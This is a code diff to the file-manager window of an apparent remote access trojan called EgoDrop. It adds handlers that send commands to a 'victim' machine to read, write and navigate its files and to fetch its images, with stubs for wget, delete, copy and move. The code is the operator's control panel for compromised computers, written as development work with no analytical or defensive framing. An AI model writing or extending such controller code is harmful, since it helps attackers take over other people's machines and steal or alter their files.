@@ -12,7 +12,8 @@ namespace EgoDrop
 {
     public partial class frmFileMgr : Form
     {
-        private clsVictim m_victim { get; set; }
+        public clsVictim m_victim { get; set; }
+
         private string m_szInitDir { get; set; }
         private struct stFileInfo
         {
@@ -31,7 +32,7 @@ namespace EgoDrop
                 string szFilePath,
                 ulong nFileSize,
                 string szPermission,
-                
+
                 string szCreationDate,
                 string szLastModifiedDate,
                 string szLastAccessedDate
@@ -122,7 +123,9 @@ namespace EgoDrop
                                     lsFile.Add(file);
                             }
 
-                            //todo: sorting lists.
+                            //Sorting.
+                            lsFolder.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
+                            lsFile.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
 
                             List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();
                             foreach (var entry in lFinal)
@@ -149,6 +152,78 @@ namespace EgoDrop
                             tnNode.EnsureVisible();
 
                             listView1.Refresh();
+
+                            toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}] File[{lsFile.Count}]";
+                        }
+                        else if (lsMsg[1] == "wf")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "rf")
+                        {
+                            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(victim);
+                            if (f == null)
+                            {
+                                f = new frmFileEditor(victim);
+                                f.Show();
+                            }
+                            else
+                            {
+                                f.BringToFront();
+                            }
+
+                            int nCode = int.Parse(lsMsg[2]);
+                            if (nCode == 0)
+                            {
+                                clsTools.fnShowErrMsgbox(lsMsg[4]);
+                                return;
+                            }
+
+                            string szFilePath = lsMsg[3];
+                            string szFileContent = lsMsg[4];
+
+                            f.fnAddNewPage(szFilePath, szFileContent);
+                        }
+                        else if (lsMsg[1] == "goto")
+                        {
+                            int nCode = int.Parse(lsMsg[2]);
+                            string szDirPath = lsMsg[3];
+
+                            if (nCode == 0)
+                            {
+                                clsTools.fnShowErrMsgbox("Directory does not exist: " + szDirPath);
+                                textBox1.Text = (string)textBox1.Tag;
+                                textBox1.SelectionStart = textBox1.Text.Length;
+
+                                return;
+                            }
+
+                            TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
+                            treeView1.SelectedNode = tnNode;
+                        }
+                        else if (lsMsg[1] == "uf")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "df")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "wget")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "del")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "cp")
+                        {
+
+                        }
+                        else if (lsMsg[1] == "mv")
+                        {
+
                         }
                     }
                 }
@@ -158,6 +233,8 @@ namespace EgoDrop
                 }
             }));
         }
+
+        private stFileInfo fnGetInfoStruct(ListViewItem item) => (stFileInfo)item.Tag;
 
         private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
         {
@@ -208,7 +285,15 @@ namespace EgoDrop
                     if (tnNode == null)
                     {
                         tnNode = new TreeNode(split.First());
-                        node.Nodes.Add(tnNode);
+
+                        int nIdx = 0;
+                        foreach (TreeNode t in node.Nodes)
+                        {
+                            if (string.Compare(tnNode.Text, t.Text) > 0)
+                                nIdx++;
+                        }
+
+                        node.Nodes.Insert(nIdx, tnNode);
 
                         return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                     }
@@ -242,11 +327,33 @@ namespace EgoDrop
 
         public void fnWriteFile(string szFilePath, string szContent)
         {
-
+            m_victim.fnSendCommand(new string[]
+            {
+                "file",
+                "wf",
+                szFilePath,
+                szContent,
+            });
         }
-        public void fnReadFile(string szFilePath, string szContent)
-        {
 
+        public void fnReadFile(string szFilePath)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "file",
+                "rf",
+                szFilePath,
+            });
+        }
+
+        public void fnGoto(string szDirPath)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "file",
+                "goto",
+                szDirPath,
+            });
         }
 
         private void fnSetup()
@@ -269,6 +376,77 @@ namespace EgoDrop
         {
             string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
             m_victim.fnSendCommand("file|sd|" + szPath);
+        }
+
+        private void listView1_DoubleClick(object sender, EventArgs e)
+        {
+            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
+            if (item == null)
+                return;
+
+            stFileInfo info = fnGetInfoStruct(item);
+            if (info.bDirectory)
+            {
+                TreeNode node = fnFindTreeNodeByPath(info.szFilePath, treeView1.Nodes);
+                treeView1.SelectedNode = node;
+            }
+            else
+            {
+                fnReadFile(info.szFilePath);
+            }
+        }
+
+        private void textBox1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                string szDirPath = textBox1.Text;
+                fnGoto(szDirPath);
+            }
+        }
+
+        private void toolStripMenuItem11_Click(object sender, EventArgs e)
+        {
+            List<string> lsImage = listView1.Items.Cast<ListViewItem>().ToList()
+                .Select(x => fnGetInfoStruct(x))
+                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
+                .Select(x => x.szFilePath)
+                .ToList();
+
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
+            if (f == null)
+            {
+                f = new frmFileImage(m_victim);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+
+            f.fnSendImageRequest(lsImage);
+        }
+
+        private void toolStripMenuItem12_Click(object sender, EventArgs e)
+        {
+            List<string> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList()
+                .Select(x => fnGetInfoStruct(x))
+                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
+                .Select(x => x.szFilePath)
+                .ToList();
+
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
+            if (f == null)
+            {
+                f = new frmFileImage(m_victim);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+
+            f.fnSendImageRequest(lsImage);
         }
     }
 }
